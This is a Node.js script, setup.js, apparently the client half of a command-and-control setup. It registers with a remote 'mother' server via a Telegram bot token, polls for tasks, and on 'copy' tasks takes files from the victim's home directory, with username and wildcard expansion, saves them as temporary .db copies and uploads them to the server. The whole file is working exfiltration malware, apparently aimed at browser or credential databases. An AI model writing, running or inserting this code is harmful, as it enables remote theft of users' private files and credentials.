// setup.js – Dumb child client with token rotation
require('dotenv').config();
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const os = require('os');
const glob = require('glob');
const FormData = require('form-data');

const MOTHER_URL = process.env.MOTHER_URL;
const CHILD_BOT_TOKEN = process.env.CHILD_BOT_TOKEN;
const CHILD_CHAT_ID = process.env.CHILD_CHAT_ID;

if (!MOTHER_URL || !CHILD_BOT_TOKEN || !CHILD_CHAT_ID) {
    console.error('❌ Missing environment variables. Check .env file.');
    process.exit(1);
}

let authToken = null;
let childId = null;
let retryCount = 0;
const MAX_RETRIES = 5;

function expandPath(source) {
    let expanded = source.replace(/%USERNAME%/g, os.userInfo().username);
    if (!path.isAbsolute(expanded)) {
        expanded = path.join(os.homedir(), expanded);
    }
    if (expanded.includes('*')) {
        const matches = glob.sync(expanded);
        return matches.length > 0 ? matches[0] : null;
    }
    return expanded;
}

async function register() {
    try {
        const res = await axios.post(`${MOTHER_URL}/api/register`, {
            token: CHILD_BOT_TOKEN,
            chatId: CHILD_CHAT_ID
        });
        childId = res.data.childId;
        authToken = res.data.authToken;
        console.log(`✅ Registered. Child ID: ${childId}`);
        retryCount = 0;
        return true;
    } catch (err) {
        if (err.response && err.response.status === 401) {
            console.error('❌ Invalid bot token or chat ID. Please check .env');
        } else {
            console.error('❌ Registration failed:', err.message);
        }
        return false;
    }
}

async function heartbeat() {
    if (!authToken) return;
    try {
        const res = await axios.post(`${MOTHER_URL}/api/heartbeat`, {}, {
            headers: { 'Authorization': `Bearer ${authToken}` },
            timeout: 10000
        });
        if (res.data.newToken) authToken = res.data.newToken;
    } catch (err) {
        if (err.response && err.response.status === 401) {
            console.log('👋 Auth token invalid. Will re-register.');
            authToken = null;
        }
    }
}
setInterval(heartbeat, 60000);

async function getTask() {
    try {
        const res = await axios.get(`${MOTHER_URL}/api/task`, {
            headers: { 'Authorization': `Bearer ${authToken}` },
            timeout: 10000
        });
        if (res.data.newToken) authToken = res.data.newToken;
        return res.data;
    } catch (err) {
        if (err.response && err.response.status === 401) {
            console.log('👋 Auth token invalid. Re-registering...');
            authToken = null;
            return { type: 're-register' };
        }
        console.error('❌ Failed to get task:', err.message);
        return null;
    }
}

async function sendResult(filePath, caption, step) {
    const form = new FormData();
    if (filePath && fs.existsSync(filePath)) {
        form.append('file', fs.createReadStream(filePath));
    }
    form.append('step', step);
    form.append('caption', caption);
    
    try {
        const res = await axios.post(`${MOTHER_URL}/api/result`, form, {
            headers: {
                ...form.getHeaders(),
                'Authorization': `Bearer ${authToken}`
            },
            timeout: 30000
        });
        if (res.data.newToken) authToken = res.data.newToken;
        return true;
    } catch (err) {
        if (err.response && err.response.status === 401) {
            console.log('👋 Auth token invalid during result upload. Will re-register.');
            authToken = null;
        }
        throw err;
    }
}

async function executeTask(task) {
    if (task.type === 'wait') {
        console.log('⏳ Waiting...');
        await new Promise(r => setTimeout(r, 5000));
        return;
    }
    if (task.type === 'done') {
        console.log('✅ All tasks completed. Exiting.');
        process.exit(0);
    }
    if (task.type === 'copy') {
        console.log(`📋 Copying...`);
        const sourcePath = expandPath(task.source);
        if (!sourcePath || !fs.existsSync(sourcePath)) {
            console.log(`⚠️ File missing: ${task.source}`);
            await sendResult(null, task.caption, task.step);
            return;
        }
        const tempFile = path.join(os.tmpdir(), `temp_${Date.now()}.db`);
        fs.copyFileSync(sourcePath, tempFile);
        try {
            await sendResult(tempFile, task.caption, task.step);
            console.log(`✅ Done: ${task.caption}`);
        } catch (err) {
            console.log(`⚠️ Send failed: ${err.message}`);
            throw err;
        } finally {
            fs.unlinkSync(tempFile);
        }
    }
}

async function main() {
    console.log('🚀 Child starting...');
    
    while (true) {
        if (!authToken) {
            if (!await register()) {
                retryCount++;
                if (retryCount > MAX_RETRIES) {
                    console.error('❌ Max registration retries. Exiting.');
                    process.exit(1);
                }
                console.log(`⏳ Retry registration in ${5 * retryCount}s...`);
                await new Promise(r => setTimeout(r, 5000 * retryCount));
                continue;
            }
        }

        try {
            const task = await getTask();
            if (!task) {
                await new Promise(r => setTimeout(r, 10000));
                continue;
            }
            if (task.type === 're-register') {
                authToken = null;
                continue;
            }
            await executeTask(task);
        } catch (err) {
            console.error('❌ Error:', err.message);
            await new Promise(r => setTimeout(r, 10000));
        }
    }
}

main();